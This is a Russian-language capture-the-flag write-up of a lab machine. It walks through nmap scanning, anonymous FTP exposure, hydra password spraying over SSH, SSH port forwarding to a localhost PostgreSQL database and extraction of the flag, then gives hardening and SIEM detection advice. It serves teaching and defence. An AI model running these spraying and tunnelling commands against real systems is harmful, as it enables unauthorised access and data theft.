## 1. Recon

### Сетевое сканирование
Первичная сетевая разведка выполнялась с помощью `nmap` для выявления открытых портов, используемых сервисов и версий.

```bash
sudo nmap -sC -sV 10.129.X.X
```

**Ключевой вывод Nmap:**
```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```

### Логика разведки
1. Обнаружен доступный сервис **FTP (порт 21/tcp)** со включенной анонимной авторизацией (`ftp-anon`).
2. При подключении анонимным пользователем в каталоге `mail_backup` были обнаружены и выгружены два файла:
   - `welcome_28112022`: корпоративное приветственное письмо, содержащее список локальных почтовых аккаунтов (`optimus`, `albert`, `andreas`, `christine`, `maria`).
   - `password_policy.pdf`: политика паролей компании, где в качестве примера был зафиксирован стандартный временный пароль для новых учетных записей (`<REDACTED_PASSWORD>`).

## 2. Vulnerability / Misconfig Analysis

Атака и компрометация данных стали возможны благодаря цепочке из трех ключевых архитектурных и конфигурационных недостатков:

### 1. Небезопасная конфигурация FTP (Anonymous Access & Information Disclosure)
- **Root Cause**: Анонимный доступ к FTP-серверу был открыт на чтение к внутренним служебным документам компании без разграничения доступа на уровне каталогов.
- **Влияние**: Утечка списка корпоративных логинов и дефолтного пароля через доступ к несекретному хранилищу.

### 2. Парольная гигиена и отсутствие принудительной смены учетных данных (Password Spraying)
- **Root Cause**: Отсутствие флага принудительной смены пароля при первом входе (`chage -d 0 <user>` в Linux) и отсутствие централизованной проверки надежности/уникальности временных паролей.
- **Влияние**: Пользователь `christine` не сменил стандартный пароль, что позволило получить интерактивный SSH-доступ к хосту без подбора по большим словарям.

### 3. Сегментация и повторное использование учетных данных (Credential Reuse & Port Forwarding)
- **Root Cause**: Использование одного и того же системного пароля пользователя `christine` для доступа к базе данных PostgreSQL, а также отсутствие запрета на проброс портов (`AllowTcpForwarding yes`) в конфигурации демона SSH.
- **Влияние**: Сервис СУБД, изолированный разработчиками на `127.0.0.1`, был успешно проброшен на внешнюю атакующую машину через локальный SSH-туннель.

## 3. Exploitation

### Шаг 1: Password Spraying через Hydra
На основе извлеченных из почтового дампа логинов сформирован список `users.txt` и выполнена валидация пароля по умолчанию:

```bash
hydra -L users.txt -p '<REDACTED_PASSWORD>' -u -t 4 ssh://10.129.X.X
```

**Результат валидации:**
```text
[22][ssh] host: 10.129.X.X   login: christine   password: <REDACTED_PASSWORD>
1 of 1 target successfully completed, 1 valid password found
```

### Шаг 2: Внутренняя энумерация сокетов и процессов
После входа по SSH выполнен аудит локально слушающих портов:

```bash
christine@funnel:~$ ss -tulpn
```
```text
Netid  State   Local Address:Port   Peer Address:Port   Process
tcp    LISTEN  127.0.0.1:5432       0.0.0.0:*           -
```

Проверка запущенных процессов подтвердила наличие инстанса PostgreSQL, проксируемого через Docker:
```bash
christine@funnel:~$ ps aux | grep postgres
```

### Шаг 3: SSH Local Port Forwarding
Так как СУБД PostgreSQL слушала исключительно интерфейс `127.0.0.1`, с локальной атакующей машины был поднят SSH-туннель для проброса порта `5432`:

```bash
ssh -L 5432:127.0.0.1:5432 christine@10.129.X.X
```

### Шаг 4: Извлечение данных из PostgreSQL
Подключение к локально проброшенному порту с помощью клиента `psql`:

```bash
psql -h 127.0.0.1 -p 5432 -U christine
```

Навигация по структуре СУБД и получение флага:
```sql
-- Вывод доступных баз данных
\l

-- Подключение к целевой БД
\c secrets

-- Просмотр списка таблиц и схемы
\dt
\d flag

-- Извлечение конфиденциальных данных
SELECT value FROM flag;
```

**Вывод запроса:**
```text
              value               
----------------------------------
 <REDACTED_FLAG>
(1 row)
```

## 4. Remediation & SOC Detection

### Практические меры защиты (Remediation)
1. **FTP Hardening**:
   - Отключить анонимный доступ (`anonymous_enable=NO` в `/etc/vsftpd.conf`).
   - Изолировать пользователей в домашних каталогах (`chroot_local_user=YES`).
2. **Управление жизненным циклом учетных записей**:
   - При создании временных паролей для новых сотрудников принудительно устанавливать требование немедленной смены пароля при первом входе:
     ```bash
     chage -d 0 christine
     ```
   - Запретить генерацию предсказуемых или одинаковых дефолтных паролей для группы пользователей.
3. **SSH & Сетевое разграничение**:
   - Если проброс портов не требуется рядовым пользователям для работы, ограничить SSH-туннелирование в `/etc/ssh/sshd_config`:
     ```text
     AllowTcpForwarding no
     AllowAgentForwarding no
     ```
   - Настроить аутентификацию в СУБД PostgreSQL по уникальным паролям/сертификатам, исключая совпадение с системными паролями пользователей.

### SOC & Detection Perspective
| Источник логов / Уровень | Сигнатура / Поведение | Рекомендуемое правило SIEM/EDR |
| :--- | :--- | :--- |
| **Auth.log / SSH (Linux)** | Множественные попытки входа за короткий промежуток времени с одного IP для разных пользователей (`Password Spraying`). | Алерт: >3 неудачных SSH-входов для разных аккаунтов от одного IP в окне 2 минут. |
| **Fail2ban / PAM** | Брутфорс и перебор сервисов. | Блокировка IP-адреса на уровне iptables после 3–5 неудачных попыток аутентификации. |
| **Auditd / EDR** | Создание SSH-туннелей (открытие listening-сокетов непривилегированными пользователями, проброс портов). | Мониторинг вызовов сетевых сокетов клиентом `ssh` с флагами локального/динамического форвардинга. |
| **PostgreSQL Audit Log** | Подключение непривилегированных системных пользователей к нестандартным базам данных (`secrets`). | Логирование всех DQL-запросов к чувствительным таблицам с помощью расширения `pgaudit`. |

## 5. Lessons Learned

- **Комбинация малозначительных утечек (Low-Severity Findings)**: Ни анонимный доступ к FTP, ни шаблонный PDF-документ сами по себе не давали RCE, но в связке с человеческим фактором (неизмененный пароль) привели к полной компрометации внутренней БД.
- **Локальная изоляция обманчива**: Ограничение сервиса только интерфейсом `127.0.0.1` защищает от внешних сканеров, но полностью нивелируется при наличии учетных данных любого локального пользователя с правом SSH-туннелирования.
- **Разделение прав доступа (Principle of Least Privilege)**: Учетные записи для доступа к ОС не должны автоматически обладать правами владельца или читателя служебных баз данных.
